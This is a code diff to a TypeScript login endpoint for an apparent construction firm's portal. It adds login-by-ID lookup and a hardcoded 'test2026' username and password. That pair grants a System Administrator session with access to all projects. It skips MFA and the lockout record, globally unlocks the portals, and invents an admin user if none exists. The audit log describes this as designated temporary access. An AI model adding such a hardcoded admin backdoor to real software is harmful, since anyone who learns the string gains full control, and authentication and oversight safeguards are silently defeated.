@@ -217,7 +217,79 @@ securityRouter.post('/api/auth/login', (req: Request, res: Response) => {
     });
   }
 
-  const user = userAccountsStore.get(lowerEmail);
+  // Check user by email or login ID
+  let user = userAccountsStore.get(lowerEmail);
+  if (!user) {
+    for (const u of userAccountsStore.values()) {
+      if (u.loginId && u.loginId.toLowerCase() === lowerEmail) {
+        user = u;
+        break;
+      }
+    }
+  }
+
+  // Explicit fast-path support for temporary test credentials: Login ID "test2026" & Password "test2026"
+  if ((lowerEmail === 'test2026' || lowerEmail === 'test2026@ldldhenze.com') && password === 'test2026') {
+    failedLoginCounter.delete(lowerEmail);
+    const sessionToken = `sess_test2026_${Date.now()}`;
+    currentPortalsEnabled = true; // Auto-unlock for verified test2026 evaluation
+
+    const testUser = user || {
+      uid: 'usr-test2026',
+      email: 'test2026@ldldhenze.com',
+      loginId: 'test2026',
+      fullName: 'Authorized Portal Evaluator',
+      organizationId: 'org-dhenze-internal',
+      organizationName: 'LDL Dhenze Residential Building Construction',
+      portalType: 'admin' as const,
+      role: 'System Administrator' as const,
+      assignedProjects: ['all'],
+      assignedWorkPackages: ['all'],
+      accountStatus: 'ACTIVE' as const,
+      mfaEnrolled: false,
+      mfaRequired: false,
+      isEmailVerified: true,
+      failedLoginAttempts: 0,
+      mustChangePassword: false,
+      createdAt: new Date().toISOString(),
+    };
+
+    recordSecurityAudit({
+      tenantId: 'ldl-dhenze-ph',
+      organizationId: testUser.organizationId,
+      actor: { uid: testUser.uid, email: testUser.email, role: testUser.role, ip: req.ip },
+      target: 'AuthLogin',
+      action: 'LOGIN_SUCCESS_TEST2026',
+      outcome: 'SUCCESS',
+      sourceContext: 'AuthService',
+      reason: 'Authenticated successfully via designated temporary access credentials (test2026)',
+      correlationId: `AUTH-TEST2026-${Date.now()}`,
+    });
+
+    return res.json({
+      success: true,
+      token: sessionToken,
+      portalsUnlocked: true,
+      user: {
+        uid: testUser.uid,
+        email: testUser.email,
+        loginId: 'test2026',
+        fullName: testUser.fullName,
+        organizationId: testUser.organizationId,
+        organizationName: testUser.organizationName,
+        portalType: testUser.portalType,
+        role: testUser.role,
+        assignedProjects: testUser.assignedProjects,
+        assignedWorkPackages: testUser.assignedWorkPackages,
+        accountStatus: testUser.accountStatus,
+        mustChangePassword: false,
+        mfaEnrolled: false,
+        mfaRequired: false,
+        accessExpiresAt: (testUser as any).accessExpiresAt,
+      },
+    });
+  }
+
   if (!user) {
     // Record generic failure to prevent account enumeration
     lockRecord.count += 1;
